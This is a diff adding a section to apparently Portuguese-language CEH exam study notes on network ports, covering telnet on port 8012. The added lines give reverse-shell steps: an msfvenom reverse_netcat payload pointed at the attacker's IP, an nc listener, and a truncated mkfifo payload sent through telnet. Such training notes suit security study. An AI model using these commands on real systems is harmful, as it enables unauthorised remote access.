@@ -535,6 +535,18 @@ https://cutt.ly/ceh-practical-git-udy
 ### Porta 5900
 
 	–> VCN – TCP/UDP – O serviço VNC (Virtual Network Computing) pode permitir acesso indesejado ao computador que têm esse serviço habilitado,  podendo ser usado para ataques ou roubo de informações,
+
+### Porta 8012
+
+	–> Telnet – podemos nos conectar via telnet nessa porta e tentar uma invasao
+	Ao achar essa porta aberta podemos criar um payload e jogar dentro da maquina para conseguir uma shell
+		msfvenom -p cmd/unix/reverse_netcat LHOST=myip LPORT=444
+	copio o payload todo mkfifo /tmp/..../tmp/msnht..
+	abro um nc -lnvp 444
+	vou ate o telnet aberto na porta 8012 e dou um run
+		RUN mkfifo /tmp/..../tmp/msnht..
+	ele abrira uma shell
+ 
 ### Porta 10000
 
 	–> TCP – Porta padrão de acesso ao Miniserv / Webmin httpd. 
